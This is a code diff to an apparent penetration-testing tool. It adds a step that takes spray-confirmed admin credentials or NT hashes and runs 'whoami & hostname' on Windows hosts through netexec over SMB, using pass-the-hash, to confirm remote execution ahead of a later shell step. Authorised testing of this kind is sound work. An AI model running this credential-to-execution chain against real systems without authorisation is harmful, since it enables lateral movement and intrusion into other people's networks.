@@ -2223,6 +2223,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ak) smb-exec: command execution confirmed over admin creds → shell channel ready
+    if sid == "smb-exec":
+        hits = re.findall(r"^✗ EXEC (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                "summary": f"code exec: {shown}"[:140]}
+
     # 2aj) smb-spray: harvested creds valid elsewhere (reuse) → local admin is critical
     if sid == "smb-spray":
         admin = re.findall(r"^✗ ADMIN (.+?)\s{2}", output, re.M)
@@ -2922,7 +2931,7 @@ _EXPLOIT_STEPS = {
         ("DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)", "smb-dccve"),
         # ── creds → exec / dump ──
         ("Spray creds & hashes (mind lockout)", "smb-spray"),
-        "Valid creds / hash → shell",
+        ("Valid creds / hash → shell", "smb-exec"),
         "Dump SAM / LSA / LSASS; DCSync",
         "Writable share → hash capture / payload",
         # ── land a shell & foothold ──
@@ -9444,6 +9453,66 @@ def _tool_smb_spray(ip: str, port: int, proto: str) -> str:
     return f"Credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 10: valid creds / hash → command execution (confirm the channel) ──
+_SMBEXEC_DEADLINE = 240          # s — overall cap
+
+
+def _gather_smb_admin() -> list:
+    """(host, user, secret) pairs confirmed local-admin by smb-spray (annotated in smb-creds)."""
+    out, seen = [], set()
+    for row in fetch_hosts():
+        for sid, output in fetch_scripts(row[0], 445, "tcp"):
+            if sid != "smb-creds":
+                continue
+            for m in re.finditer(r"! (\S+?):(\S*) @ admin on (\S+)", output or ""):
+                secret = "" if m.group(2) == "<blank>" else m.group(2)
+                key = (m.group(3), m.group(1).lower(), secret)
+                if key not in seen:
+                    seen.add(key)
+                    out.append((m.group(3), m.group(1), secret))
+    return out
+
+
+def _tool_smb_exec(ip: str, port: int, proto: str) -> str:
+    """SMB step 10 tool: confirm command execution over the admin creds smb-spray proved
+    (Pwn3d!), running read-only recon (whoami / hostname) via netexec's -x (auto wmiexec →
+    smbexec). Non-interactive — it proves the exec channel and its context; spawning an
+    interactive, upgraded shell is step 13 (foothold). Uses pass-the-hash when the secret is
+    an NT hash. No root. Raises if smb-spray hasn't confirmed any local admin yet.
+    Authorised targets only."""
+    import time
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to execute over SMB")
+    admins = _gather_smb_admin()
+    if not admins:
+        raise RuntimeError("no confirmed admin creds — run smb-spray (r9) first")
+    deadline = time.time() + _SMBEXEC_DEADLINE
+
+    confirmed = []                                # (host, who, context)
+    for host, user, secret in admins:
+        if time.time() > deadline:
+            break
+        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+        _, out = _smb_run([nxc, "smb", host, *auth, "-x", "whoami & hostname"], 90)
+        if not re.search(r"\b445\b.*\[\+\]", out):
+            continue
+        ctx = next((ln for ln in _nxc_body(out).splitlines() if ln.strip()), "")
+        confirmed.append((host, user, ctx.strip()))
+
+    lines = [f"[*] {len(admins)} admin cred(s) tried · {len(confirmed)} exec confirmed"]
+    for host, who, ctx in confirmed:
+        tail = f" → {ctx}" if ctx else ""
+        lines.append(f"✗ EXEC {who} @ {host}{tail}")
+    if confirmed:
+        lines.append("· command execution confirmed via netexec (-x, auto wmiexec/smbexec) — "
+                     "spawn an interactive shell at step 13 (foothold)")
+    else:
+        lines.append("· no exec — creds may have been rotated; re-run smb-spray (r9)")
+    return f"Credential exec — {len(admins)} admin cred(s)  (channel confirm)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9482,6 +9551,7 @@ _STEP_TOOLS = {
     "smb-coerce": ("Auth coercion (netexec coerce_plus → drives relay/poison)", _tool_smb_coerce),
     "smb-dccve": ("DC-takeover CVE scan (ZeroLogon/noPac/PrintNightmare, detection only)", _tool_smb_dccve),
     "smb-spray": ("Credential spray across hosts (netexec, reuse/lateral → admin)", _tool_smb_spray),
+    "smb-exec": ("Confirm command exec over admin creds (netexec -x → feeds foothold)", _tool_smb_exec),
 }
 
 def _mins(seconds: int) -> str:
@@ -9535,6 +9605,7 @@ _STEP_TOOL_RUNS = {
     "smb-coerce":       ("netexec coerce_plus", f"{_mins(_SMBCOERCE_DEADLINE)} min"),
     "smb-dccve":        ("netexec zerologon/nopac/printnightmare", f"{_mins(_SMBDCCVE_DEADLINE)} min"),
     "smb-spray":        ("netexec", f"{_mins(_SMBSPRAY_DEADLINE)} min"),
+    "smb-exec":         ("netexec -x", f"{_mins(_SMBEXEC_DEADLINE)} min"),
 }
 
 
@@ -9696,6 +9767,12 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-exec":                    # read-only exec confirm over proven admin creds
+        na = len(_gather_smb_admin())
+        print(f"{DIM}   confirms command exec over {BOLD}{na}{RESET}{DIM} proven admin cred(s) via "
+              f"{BOLD}netexec -x{RESET}{DIM} (read-only whoami/hostname) — interactive shell is "
+              f"{BOLD}step 13{RESET}{DIM} · {RESET}{YELLOW}authorised targets only{RESET}{DIM} · "
+              f"deadline {_SMBEXEC_DEADLINE // 60} min{RESET}")
     if tool_key == "smb-spray":                   # real creds only — 1 try/host, no guessing
         nc, nh = len(_gather_all_smb_creds()), len(_smb_spray_hosts())
         print(f"{DIM}   validates {BOLD}{nc}{RESET}{DIM} harvested cred(s) across {BOLD}{nh}{RESET}"
